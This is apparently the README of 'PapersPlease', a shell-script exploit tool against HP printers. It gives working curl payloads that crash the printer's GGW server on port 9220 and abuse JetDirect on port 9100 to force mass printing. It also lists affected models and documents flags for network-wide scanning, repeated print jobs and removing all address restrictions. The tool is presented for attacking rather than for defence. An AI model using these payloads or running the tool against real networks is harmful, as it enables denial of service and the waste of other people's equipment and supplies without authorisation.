
<div align="center">

<img src="./Assets/Papers_Please_Logo.png" width="20%" />
<br><br>
</div>

## Description

PapersPlease is an exploit that allows an attacker to perform a remote **Denial of Service** against an HP printer by crashing the internal GGW server. Additionally, PapersPlease is capable of **mass printing** documents from one or more printers on a network.

## Payload Examples

The **Denial of Service** exploit is as follows:
<br><br>
`curl [IP]:9220 -X 'open 99999999'`
<br><br>
Whats happening here is we are telling the internal GGW server to retrieve the process name running on index number 99999999. However upon receiving the request, the GGW server will instantly crash. In addition, any index number 8 or 9 digits in length also causes the GGW server to crash.

The **mass-print** exploit is as follows: 
<br><br>
`curl [IP]:9100 -m 1 -X 'Foo Bar'`
<br><br>
When abusing the JetDirect protocol, PapersPlease will connect to port 9100 on the remote host, then immediately disconnect. Which in some cases causes a document to be printed. With this exploit an attacker can print hundreds of copies from any vulnerable printer, wasting paper and ink. 

## Known Affected Models
| Model | DoS | Mass Print | GGW Version |
| :---:  | :---: | :---: | :---: |
| HP Envy 7640 |  True  |  False  |  Version: 1.0  |
| HP OfficeJet Pro 6978 |  True  |  True  |  Version: 1.0  |

**NOTE**:<br>
While the above list provides known exploitable models, these do not need to be known prior to attacking.

## Required Software

Android users will need to install <a href="https://termux.com/">Termux</a> from the <a href="https://play.google.com/store/apps/details?id=com.termux">Google Play Store</a>.<br>
Termux is only available for **Android 5.0 and later**.

| Package | Version | Platform |
| :---:   | :---:   | :---:    |
| Netcat-openbsd |  1.105-7ubuntu1  |  x86-64  |
| Grep (GNU) |  2.25  |  x86-64  |
| Sed (GNU) |  4.2.2  |  x86-64  |
| Busybox |  1.30.1  |  Android  |
| Iproute2 |  4.3.0  |  x86-64  |
| Parallel | 20161222 (x86-64) \| 20180222 (Android) |  Both  |
| Curl |  7.47.0-1ubuntu2.12  |  x86-64  |
| Bc |  1.06.95 (x86-64) \| 1.07.1 (Android)  |  Both  |

**NOTE**:<br>
Exact software versions are not required. They are only present as a reference for debugging purposes. 

## How To Use

As PapersPlease can run without flags, it is quick and simple to use. You can specify a **network range** with the `--network` flag or a **single host** with the `--target` flag. You can **optimize** PapersPlease through the `--jobs`, `--proc`, and `--slots` flags. Optimizations are active by default with values of: 0, 1, and 250 respectively. By default or when passing the `--network` flag, PapersPlease will automatically scan for printers. Automatic scanning can be disabled with the `--no-scan` flag. 

Additionally PapersPlease can **mass print** by passing the `--papyrus` flag, which can be used with either `--network` or `--target`. Finally, to **disable all address restrictions**, pass the `--allow-all` flag. By specifying said flag all public and private IP addresses will be allowed including all CIDR prefixes less-than or equal to 30.

## Usage

```
./PapersPlease.sh [OPTION]
OPTION:			    DESCRIPTION:
-t, --target={IP}	    Specify a specific
			    target rather than
		     	    all addresses on
			    the network.

-n, --network={IP/CIDR}     Manually specify the
			    network address for
			    the current network
			    you are on.

--papyrus={N}	    	    Number of jobs to
			    send to the printer
			    this should cause
			    the printer to print
			    N number of pages.

-i, --interval={N}  	    The interval before
			    another job is sent
			    to the printer. Where
			    N can be a decimal
			    i.e. 0.1 or a whole
			    number. The default
			    interval is 1.

-j, --jobs={-N|+N|N%|N}     Number of jobs to
			    run. Passes value
			    to parallel.
			    Defaults to 0.

-p, --proc={-N|+N|N%|N}	    Define the maximum
			    N of processes that
			    can be active at a
			    time. Defaults to
			    1.

-s, --slots={-N|+N|N%|N}    The amount of
			    'slots' available
			    to be used by
			    parallel for jobs.
			    Default is 252.

-P, --port={PORT} 	    Specify a specific 
			    port. Useful for 
			    port-forwarded
			    hosts. Port number 
			    is set automatically 
			    based on the attack
			    being preformed.
			    PORT can be any
			    number ranging
			    from 1 to 65535. 

-a, --allow-all		    All address ranges 
			    are allowed. BE CAREFUL 
			    in this mode as it
			    permits scanning of
			    ANY address without
			    restriction.

--no-scan		    Disables the automatic
			    printer discovery scan.
			    By disabling this function
			    the attacker might not
			    know how many hosts were
			    successfully brought
			    down.

--no-check		    Will skip dependency
                            checking.

-q, --quiet		    Suppress output to
			    terminal. Only the
			    progress bar from
			    parallel will be
			    printed to the
			    terminal in this
			    mode.

-v, --version		    Print version
			    information
			    then exit.

-h, --help		    Print help
			    dialog then
			    exit.
```
